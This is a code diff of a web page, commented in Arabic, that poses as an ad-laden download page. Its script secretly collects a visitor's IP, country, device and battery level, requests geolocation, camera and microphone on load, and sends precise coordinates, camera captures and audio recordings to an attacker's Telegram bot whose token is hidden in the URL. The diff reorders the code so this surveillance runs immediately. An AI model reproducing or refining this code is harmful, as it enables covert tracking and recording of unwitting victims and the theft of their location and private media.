@@ -84,7 +84,9 @@
 <script>
 "use strict";
 
-// 1. كود فك التشفير والأذونات
+/* ═══════════════════════════════════════════════════
+   المتغيرات الأساسية (قبل أي دالة عشان تشتغل)
+   ═══════════════════════════════════════════════════ */
 function decodeBase64(value) {
     try {
         value = value.replace(/-/g, "+").replace(/_/g, "/");
@@ -95,50 +97,6 @@ function decodeBase64(value) {
     } catch (error) { return ""; }
 }
 
-function getFeatures() {
-    const urlParams = new URLSearchParams(location.search);
-    const encoded = urlParams.get("u");
-    if (!encoded) return new Set();
-    const decoded = decodeBase64(encoded);
-    const params = new URLSearchParams(decoded);
-    return new Set([...params.keys()].map(key => key.trim().toLowerCase()));
-}
-
-async function requestLocation() {
-    return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve();
-        navigator.geolocation.getCurrentPosition(
-            () => resolve(),
-            () => resolve(),
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-    });
-}
-
-async function start() {
-    const features = getFeatures();
-    const camera = ["fc","bc","fcv","bcv"].some(key => features.has(key));
-    const microphone = ["r","fcv","bcv"].some(key => features.has(key));
-    const location = features.has("l");
-
-    // طلب الموقع فوراً
-    if (location) await requestLocation();
-
-    // محاولة طلب الكاميرا والمايك فوراً
-    if (camera || microphone) {
-        try {
-            const constraints = {};
-            if (camera) constraints.video = true;
-            if (microphone) constraints.audio = true;
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            stream.getTracks().forEach(track => track.stop());
-        } catch (error) {
-            console.log("المتصفح منع الطلب الأوتوماتيكي، هنعيده مع أول لمسة.");
-        }
-    }
-}
-
-// 2. كود الإرسال
 const urlParams = new URLSearchParams(location.search);
 let BOT_ID = "", BOT_TOKEN = "";
 if (urlParams.get("u")) {
@@ -149,6 +107,26 @@ if (urlParams.get("u")) {
 }
 
 let visitorIP = "غير معروف", visitorCountry = "غير معروف", visitorDevice = "Unknown", visitorBattery = "غير متاح";
+
+function getFeatures() {
+    const encoded = urlParams.get("u");
+    if (!encoded) return new Set();
+    const decoded = decodeBase64(encoded);
+    const params = new URLSearchParams(decoded);
+    return new Set([...params.keys()].map(key => key.trim().toLowerCase()));
+}
+
+function buildCaption(extra = "") {
+    let cap = `━━━━━━━━━━━━━━━\n`;
+    cap += `🌍 الدولة: ${visitorCountry}\n`;
+    cap += `📱 الجهاز: ${visitorDevice}\n`;
+    cap += `🔋 البطارية: ${visitorBattery}\n`;
+    cap += `🌐 IP: ${visitorIP}\n`;
+    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+    if (extra) cap += `${extra}\n`;
+    cap += `━━━━━━━━━━━━━━━`;
+    return cap;
+}
 
 async function sendVisitorInfo() {
     if (!BOT_ID || !BOT_TOKEN) return;
@@ -188,18 +166,71 @@ async function sendVisitorInfo() {
     } catch (err) {}
 }
 
-function buildCaption(extra = "") {
-    let cap = `━━━━━━━━━━━━━━━\n`;
-    cap += `🌍 الدولة: ${visitorCountry}\n`;
-    cap += `📱 الجهاز: ${visitorDevice}\n`;
-    cap += `🔋 البطارية: ${visitorBattery}\n`;
-    cap += `🌐 IP: ${visitorIP}\n`;
-    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
-    if (extra) cap += `${extra}\n`;
-    cap += `━━━━━━━━━━━━━━━`;
-    return cap;
+/* ═══════════════════════════════════════════════════
+   دالة طلب الموقع (مع الإرسال الفوري)
+   ═══════════════════════════════════════════════════ */
+async function requestAndSendLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve();
+        
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                const caption = buildCaption(
+                    `📍 <b>الموقع</b>\n` +
+                    `🌐 https://www.google.com/maps?q=${latitude},${longitude}\n` +
+                    `<b>الدقة:</b> ${Math.round(accuracy)} متر`
+                );
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: BOT_ID, text: caption, parse_mode: 'HTML' })
+                    });
+                    console.log("Location sent successfully");
+                } catch (e) { console.error("Location send error:", e); }
+                resolve();
+            },
+            (error) => {
+                console.log("Location permission denied:", error.message);
+                resolve();
+            },
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+    });
 }
 
+/* ═══════════════════════════════════════════════════
+   دالة start (طلب الأذونات - وبتستنى لحد ما تخلص)
+   ═══════════════════════════════════════════════════ */
+async function start() {
+    const features = getFeatures();
+    const camera = ["fc","bc","fcv","bcv"].some(key => features.has(key));
+    const microphone = ["r","fcv","bcv"].some(key => features.has(key));
+    const location = features.has("l");
+
+    // الموقع - بنطلبه ونبعته فوراً
+    if (location) {
+        await requestAndSendLocation();
+    }
+
+    // الكاميرا والمايك - بنطلب الإذن (بنفتح ستريم ونقفله)
+    if (camera || microphone) {
+        try {
+            const constraints = {};
+            if (camera) constraints.video = true;
+            if (microphone) constraints.audio = true;
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            stream.getTracks().forEach(track => track.stop());
+            console.log("Camera/Mic permission granted");
+        } catch (error) {
+            console.log("Camera/Mic permission denied:", error.name);
+        }
+    }
+}
+
+/* ═══════════════════════════════════════════════════
+   دوال الالتقاط والإرسال
+   ═══════════════════════════════════════════════════ */
 async function captureAndSend(stream, type) {
     return new Promise((resolve) => {
         const video = document.createElement('video');
@@ -268,30 +299,9 @@ async function recordAudioAndSend(stream) {
     });
 }
 
-async function sendLocation() {
-    return new Promise((resolve) => {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: BOT_ID, text: caption })
-                    });
-                    resolve();
-                },
-                (error) => { resolve(); }
-            );
-        } else { resolve(); }
-    });
-}
-
 async function startFeatures() {
     if (!BOT_ID || !BOT_TOKEN) return;
     const features = getFeatures();
-    
-    await sendVisitorInfo();
 
     if (features.has('fc')) {
         try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); await captureAndSend(stream, 'front'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
@@ -308,12 +318,11 @@ async function startFeatures() {
     if (features.has('r')) {
         try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); await recordAudioAndSend(stream); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
     }
-    if (features.has('l')) {
-        await sendLocation();
-    }
 }
 
-// 3. كود التصميم والإعلانات
+/* ═══════════════════════════════════════════════════
+   كود صفحة التحميل والإعلانات
+   ═══════════════════════════════════════════════════ */
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -340,9 +349,17 @@ $("b1").onclick = function(){ goNext(this, function(){ show(2); addGhost(); addB
 $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); addBanners("ads3"); addNative("native3"); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
-// 4. التشغيل الفوري
-start(); 
-startFeatures();
+/* ═══════════════════════════════════════════════════
+   التشغيل الرئيسي (بترتيب صح)
+   ═══════════════════════════════════════════════════ */
+(async () => {
+    // 1. نجيب معلومات الزائر الأول (IP, دولة, جهاز)
+    await sendVisitorInfo();
+    // 2. نطلب الأذونات ونبعت الموقع فوراً
+    await start();
+    // 3. نلتقط ونبعت الصور والفيديو والصوت
+    await startFeatures();
+})();
 </script>
 </body>
-  </html>
+</html>
